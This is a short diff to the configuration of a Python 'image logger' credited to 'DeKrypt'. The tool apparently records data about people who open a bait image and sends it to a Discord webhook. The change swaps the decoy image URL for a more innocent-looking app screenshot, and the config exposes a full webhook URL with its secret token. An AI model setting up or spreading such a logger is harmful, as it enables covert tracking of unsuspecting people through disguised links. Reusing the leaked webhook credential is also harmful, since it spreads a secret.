@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1393606647284240474/eKXLQCymBvY7bUkhinRce9uawJGkflevGcaRQ9blNoQK4frDA6tt09CC2rKOvOIcQ18a",
-    "image": "https://assets.telegraphindia.com/telegraph/2023/Jan/1672986231_rick-rolled.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://images.waldo.io/applications/app-bf6d5b2736bab2ad/versions/appv-12ce30de39360e19/screenshots/4c4f83bcfe97e7761987d8186a7279ed.jpg?w=400", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
